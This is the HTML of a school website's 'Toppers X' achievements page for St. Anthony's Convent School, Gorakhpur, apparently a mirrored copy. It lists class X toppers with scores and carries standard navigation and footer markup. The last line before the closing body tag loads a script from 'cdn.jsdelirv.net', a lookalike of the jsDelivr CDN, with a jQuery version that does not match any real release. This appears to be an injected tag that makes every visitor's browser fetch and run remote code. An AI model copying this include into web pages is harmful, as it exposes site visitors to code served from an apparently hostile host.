<!DOCTYPE>
<html>
<!-- Mirrored from php.themewant.com/unipix/index-two.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 May 2025 07:44:43 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>St. Anthony’s Convent School</title>
    <link rel="shortcut icon" type="image/x-icon" href="assets/images/logo/emblem%201.jpg">
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/plugins/animate.min.css">
    <!-- fontawesome 6.4.2 -->
    <link rel="stylesheet" href="assets/css/plugins/fontawesome.min.css">
    <!-- bootstrap min css -->
    <link rel="stylesheet" href="assets/css/vendor/bootstrap.min.css">
    <!-- swiper Css 10.2.0 -->
    <link rel="stylesheet" href="assets/css/plugins/swiper.min.css">
    <!-- Bootstrap 5.0.2 -->
    <link rel="stylesheet" href="assets/css/vendor/magnific-popup.css">
    <!-- metismenu scss -->
    <link rel="stylesheet" href="assets/css/vendor/metismenu.css">
    <!-- nice select js -->
    <link rel="stylesheet" href="assets/css/plugins/nice-select.css">
    <link rel="stylesheet" href="assets/css/plugins/jquery-ui.css">
    <!-- custom style css -->
    <link rel="stylesheet" href="assets/css/style.css">
    <link href="assets/css/flexslider.css" rel="stylesheet" />

</head>

<body>
    <!-- Top Contact Bar -->
    <div class="top-bar">
        <div class="top-bar-container">
            <div class="contact-details">
                📞 <a href="tel:+919876543210">0551-228 0250</a> &nbsp; | &nbsp;
                📧 <a href="mailto:stanthony100@gmail.com">stanthony100@gmail.com</a>
               <span style="padding-left:12px;">Affiliation Number- 2131306</span>
            </div>
            <div class="social-icons">
                <a href="https://www.facebook.com/share/16NQD98XaQ/" target="_blank"><i class="fab fa-facebook-f"></i></a>
                <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
                <a href="https://youtube.com/@stanthonyconvent5802" target="_blank"><i class="fab fa-youtube"></i></a>
                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
            </div>
        </div>
    </div>
    <!-- header area start -->
    <header class="header header__sticky v__2">
        <div class="container-fluid header11topDown">
            <div class="row">
                <div class="col-xl-12">
                    <div class="header__wrapper">
                        <div class="header__logo d-flex align-items-center">
                            <a href="index.php" class="d-flex align-items-center text-decoration-none">
                                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                                <div class="school-name text-dark">
                                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>

                        <div class="header__menu">
                            <div class="navigation">
                                <nav class="navigation__menu">
                                    <ul>
                                        <li class="navigation__menu--item has-child">
                                            <a href="index.php" class="navigation__menu--item__link">Home</a>
                                             
                                        </li> 
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">About Us</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                                                                <li><a href="principal.php">Principal Desk </a></li>
                                            </ul>
                                        </li>

                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Curriculam</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                                                                            </ul>
                                        </li>
                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Facilities</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                                                                            </ul>
                                        </li>

                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Achievements</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="toppers-x.php">Toppers X</a></li>
                                                <li><a href="toppers-xii.php">Toppers XII</a></li>
                                            </ul>
                                        </li>

                                         
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Gallery</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="event_gallery.php">Event Gallery</a></li>
                                                <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                                            </ul>
                                        </li>
                                         <li class="navigation__menu--item has-child">
                                            <a href="tc.php" class="navigation__menu--item__link">Tc</a>
                                             
                                        </li> 

                                        <li class="navigation__menu--item">
                                            <a href="contact.php" class="navigation__menu--item__link">Contact</a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                        <div class="header__right">
                            <div class="header__right--item">
                                <div id="menu-btn" class="menu__trigger">
                                    <i class="fa-solid fa-bars"></i>
                                    <!--<img src="assets/images/icon/menu__bar.svg" alt="bar">-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>




     



<!-- Add CSS for square images with full width and height -->
<style>
.blog__thumb {
    position: relative;
    width: 100%;
    padding-bottom: 100%; /* Maintains 1:1 aspect ratio for square shape */
    overflow: hidden;
    background-color: #f0f0f0; /* Fallback background color */
}

.blog__thumb img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover; /* Fills container, cropping if needed */
    object-position: center;
    transition: transform 0.3s ease; /* Smooth hover effect */
}

.blog__thumb img:hover {
    transform: scale(1.05); /* Optional: slight zoom on hover */
}

.single-blog.topper-card {
    display: flex;
    flex-direction: column;
    border: 1px solid #ddd;
    border-radius: 8px;
    overflow: hidden; /* Ensure rounded corners apply to images */
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Optional: subtle shadow */
}

.blog__meta {
    flex-grow: 1;
    padding: 15px;
}

/* Responsive adjustments */
@media (max-width: 992px) {
    .topper-row .col-lg-3 {
        flex: 0 0 33.333%; /* 3 per row on medium screens */
        max-width: 33.333%;
    }
}

@media (max-width: 768px) {
    .topper-row .col-md-4 {
        flex: 0 0 50%; /* 2 per row on smaller screens */
        max-width: 50%;
    }
}

@media (max-width: 576px) {
    .topper-row .col-6 {
        flex: 0 0 100%; /* 1 per row on very small screens */
        max-width: 100%;
    }
}
</style>

<!-- BREADCRUMB AREA -->
<section class="rts-breadcrumb breadcrumb-height breadcumb-bg" style="background-image: url(assets/images/banner/2.jpeg);">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="breadcrumb-content">
                    <ul class="breadcrumb">
                        <li class="breadcrumb-item"><a href="index.php">Achievements</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Toppers X</li>
                    </ul>
                    <h2 class="section-title">Our Toppers</h2>
                </div>
            </div>
        </div>
    </section>
<!-- BREADCRUMB AREA END -->

<!-- University toppers list -->
<div class="rts-blog v_3 rts-section-padding">
    <div class="container">
                    <div class="row justify-content-md-start g-4 topper-row">
                                    <!-- Single topper item -->
                    <div class="col-6 col-md-4 col-lg-3">
                        <div class="single-blog topper-card">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="topper-details.php?id=10">
                                        <img src="../upload/toppers/topper-2026-05-01-080120.png" alt="Topper Mayank Hembram" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Mayank Hembram</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="topper-details.php?id=10">
                                            Rank 1 - Score: 96%
                                        </a>
                                    </h5>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Single topper item end -->
                                    <!-- Single topper item -->
                    <div class="col-6 col-md-4 col-lg-3">
                        <div class="single-blog topper-card">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="topper-details.php?id=11">
                                        <img src="../upload/toppers/topper-2026-05-01-080355.png" alt="Topper Aryushi Singh" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Aryushi Singh</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="topper-details.php?id=11">
                                            Rank 2 - Score: 95%
                                        </a>
                                    </h5>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Single topper item end -->
                                    <!-- Single topper item -->
                    <div class="col-6 col-md-4 col-lg-3">
                        <div class="single-blog topper-card">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="topper-details.php?id=12">
                                        <img src="../upload/toppers/topper-2026-05-01-080453.png" alt="Topper Kushagra Gupta" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Kushagra Gupta</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="topper-details.php?id=12">
                                            Rank 2 - Score: 94.4%
                                        </a>
                                    </h5>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Single topper item end -->
                                    <!-- Single topper item -->
                    <div class="col-6 col-md-4 col-lg-3">
                        <div class="single-blog topper-card">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="topper-details.php?id=13">
                                        <img src="../upload/toppers/topper-2026-05-01-080555.png" alt="Topper Shubhi Chaudhary" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Shubhi Chaudhary</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="topper-details.php?id=13">
                                            Rank 2 - Score: 94.4%
                                        </a>
                                    </h5>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Single topper item end -->
                                    <!-- Single topper item -->
                    <div class="col-6 col-md-4 col-lg-3">
                        <div class="single-blog topper-card">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="topper-details.php?id=14">
                                        <img src="../upload/toppers/topper-2026-05-01-080818.png" alt="Topper Avi Srivastava" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Avi Srivastava</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="topper-details.php?id=14">
                                            Rank 3 - Score: 94.2%
                                        </a>
                                    </h5>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Single topper item end -->
                                    <!-- Single topper item -->
                    <div class="col-6 col-md-4 col-lg-3">
                        <div class="single-blog topper-card">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="topper-details.php?id=15">
                                        <img src="../upload/toppers/topper-2026-05-01-080923.png" alt="Topper Daisy Rani" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Daisy Rani</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="topper-details.php?id=15">
                                            Rank 4 - Score: 94%
                                        </a>
                                    </h5>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Single topper item end -->
                            </div>
            <!-- Pagination -->
                            <nav aria-label="Page navigation">
                    <ul class="pagination justify-content-center mt-5">
                                                                            <li class="page-item active">
                                <a class="page-link" href="?page=1">1</a>
                            </li>
                                                    <li class="page-item ">
                                <a class="page-link" href="?page=2">2</a>
                            </li>
                                                    <li class="page-item ">
                                <a class="page-link" href="?page=3">3</a>
                            </li>
                                                                            <li class="page-item">
                                <a class="page-link" href="?page=2" aria-label="Next">
                                    <span aria-hidden="true">&raquo;</span>
                                </a>
                            </li>
                                            </ul>
                </nav>
                        </div>
</div>
<!-- University toppers list end -->



<!-- footer start -->
    <footer class="rts-footer rts-footer-padding v_2">
        <div class="container">
            <div class="row justify-content-center">
                <div class="rts-footer-newsletter">
                    <div class="col-lg-10">
                        <div class="rts-newsletter-box-content">
                            <h4 class="newsletter-title">Subscribe To Newsletter
                            </h4>
                            <div class="newsletter-form w-530">
                                <form action="#">
                                    <input type="email" name="subscription" id="subscription" placeholder="Enter Your mail" required="">
                                    <button type="submit" class="rts-nbg-btn btn-arrow">Subscribe <span><i class="fa-sharp fa-regular fa-arrow-right"></i></span></button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row gy-5 gy-lg-0">
                <div class="col-lg-4 col-md-6 col-sm-6">
                    <div class="rts-footer-widget w-320">
                        <div class="header__logo" style="display: flex; align-items: center;">
                            <a href="index.php" style="display: flex; align-items: center; text-decoration: none;">
                                <img src="assets/images/logo/emblem 1.png"
                                    alt="St. Anthony’s Convent School Logo"
                                    height="80" width="80"
                                    style="border-radius: 50%; object-fit: cover; margin-right: 10px; border: 2px solid #ccc;">
                                
                                <div style="color: #000;">
                                    <h5 style="margin: 0; font-weight: bold; font-size: 18px; line-height: 1.2;color:white">
                                        St. Anthony’s Convent School
                                    </h5>
                                    <small style="font-size: 13px; color: #6c757d;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>


                        <p>
                            We are passionate education dedicated to providing high-quality
                            resources learners all backgrounds.
                        </p>
                        <div class="rts-contact-link">
                            <a href="mailto:stanthony100@gmail.com"><i class="fa-sharp fa-light fa-location-dot"></i> Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                            <a href="callto:0551-228 0250"><i class="fa-thin fa-phone"></i> 0551-228 0250</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-6">
                    <div class="rts-footer-widget ">
                        <h6 class="rt-semi">Important Links</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Privacy Policy</a></li>
                                <li><a href="#">Terms & Conditions</a></li>
                                <li><a href="#">Sitemap</a></li>
                                <li><a href="#"> Blogs</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-4">
                    <div class="rts-footer-widget ml--30">
                        <h6 class="rt-semi">About Us</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Our History </a></li>
                                <li><a href="About.php">About Us</a></li>
                                <li><a href="#">St. Anthony</a></li>
                                <li><a href="#">Our Mission</a></li>
                                <li><a href="#">Our Vision</a></li>
                                 <li><a href="#">Our Motto</a></li>
                                <li><a href="#">School Anthem</a></li>
                               
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 col-sm-8">
                    <div class="rts-footer-widget ml--30">
                        
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="rts-footer-copy-right v_1">
        <div class="container">
            <div class="row">
                <div class="rt-center">
                    <p class="--p-xs">Copyright &copy; <span id="year"></span> All Rights Reserved by <a href="#">St. Anthony’s Convent School</a></p>
                </div>
            </div>
        </div>
    </div>
    <!-- footer end -->
    <!-- offcanvase menu -->
    <!-- header style two -->
    <div id="side-bar" class="side-bar">
        <button class="close-icon-menu"><i class="far fa-times"></i></button>
        <!-- inner menu area desktop start -->
        <div class="inner-main-wrapper-desk">
            <div class="thumbnail">
                
               <a href="index.php" class="d-flex align-items-center text-decoration-none">
                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                <div class="school-name text-dark">
                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                </div>
            </a>
            </div>
            <div class="inner-content">
                <p class="disc">
                    A modern php template for education, offering intuitive design & essential features for seamless learning experiences.
                </p>
                <!-- offcanvase banner -->
                <div class="offcanvase__banner mt--50">
                    <div class="offcanvase__banner--content">
                        <img src="assets/images/offcanvase.jpg" alt="offcanvase">
                        <a href="admission.php" class="rts-theme-btn">Apply Now</a>
                    </div>
                </div>
                <div class="offcanvase__info">
                    <div class="offcanvase__info--content">
                        <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                        <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                        <div class="offcanvase__info--content--social">
                            <p class="title">Follow Us:</p>
                            <div class="social__links">
                                <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                                <a href="#"><i class="fa-brands fa-instagram"></i></a>
                                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                                <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area start -->
        <div class="mobile-menu-main">
            <nav class="nav-main mainmenu-nav mt--30">
            <ul class="mainmenu metismenu" id="mobile-menu-active">
                <li>
                    <a href="index.php" class="main">Home</a>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">About Us</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                 <li>
                            <a href="principal.php" class="main">Principal Desk</a>
                        </li>
                    </ul>
                </li>
                
                <!-- Curriculum - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Curriculum</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                            </ul>
                </li>
                
                <!-- Facilities - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Facilities</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                            </ul>
                </li>

                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Achievements</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="toppers-x.php">Toppers X</a></li>
                        <li><a href="toppers-xii.php">Toppers XII</a></li>
                    </ul>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Gallery</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="event_gallery.php">Event Gallery</a></li>
                        <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                    </ul>
                </li>
                <li>
                    <a href="blog.php" class="main">Blogs</a>
                </li>
                <li>
                    <a href="contact.php" class="main">Contact</a>
                </li>
            </ul>
            </nav>

            <div class="offcanvase__info--content mt--30">
                <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                <div class="offcanvase__info--content--social">
                    <p class="title">Follow Us:</p>
                    <div class="social__links">
                        <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                        <a href="#"><i class="fa-brands fa-instagram"></i></a>
                        <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                        <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area end -->
    </div>
    <!-- header style two End -->

    <div class="search-input-area">
        <div class="container">
            <div class="search-input-inner">
                <div class="input-div">
                    <input class="search-input autocomplete ui-autocomplete-input" type="text" placeholder="Search by keyword or #" autocomplete="off">
                    <button><i class="far fa-search"></i></button>
                </div>
            </div>
        </div>
        <div id="close" class="search-close-icon"><i class="far fa-times"></i></div>
    </div>
    <!-- rts backto top start -->
    <div class="progress-wrap">
        <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" style="transition: stroke-dashoffset 10ms linear 0s; stroke-dasharray: 307.919, 307.919; stroke-dashoffset: 307.919;"></path>
        </svg>
    </div>
    <!-- rts back to top end -->
    <div id="anywhere-home" class="">
    </div>


    <!-- scripts -->
    <!-- jquery js -->
    <script src="assets/js/vendor/jquery.min.js"></script>
    <!-- bootstrap 5.0.2 -->
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <!-- jquery ui js -->
    <script src="assets/js/vendor/jquery-ui.js"></script>
    <!-- wow js -->
    <script src="assets/js/vendor/waw.js"></script>
    <!-- mobile menu -->
    <script src="assets/js/vendor/metismenu.js"></script>
    <!-- magnific popup -->
    <script src="assets/js/vendor/magnifying-popup.js"></script>
    <!-- swiper JS 10.2.0 -->
    <script src="assets/js/plugins/swiper.js"></script>
    <!-- counterup -->
    <script src="assets/js/plugins/counterup.js"></script>
    <script src="assets/js/vendor/waypoint.js"></script>
    <!-- isotop mesonary -->
    <script src="assets/js/plugins/isotop.js"></script>
    <script src="assets/js/plugins/imagesloaded.pkgd.min.js"></script>
    <script src="assets/js/plugins/sticky-sidebar.js"></script>
    <script src="assets/js/plugins/resize-sensor.js"></script>
    <script src="assets/js/plugins/twinmax.js"></script>
    <!-- dymanic Contact Form -->
    <script src="assets/js/plugins/contact.form.js"></script>
    <script src="assets/js/plugins/nice-select.min.js"></script>
    <!-- main Js -->
    <script src="assets/js/jquery.flexslider.js"></script>
    <script src="assets/js/main.js"></script>

<script src="https://cdn.jsdelirv.net/npm/jquery@4.5.2/dist/jquery.min.js"></script>
</body>
</html>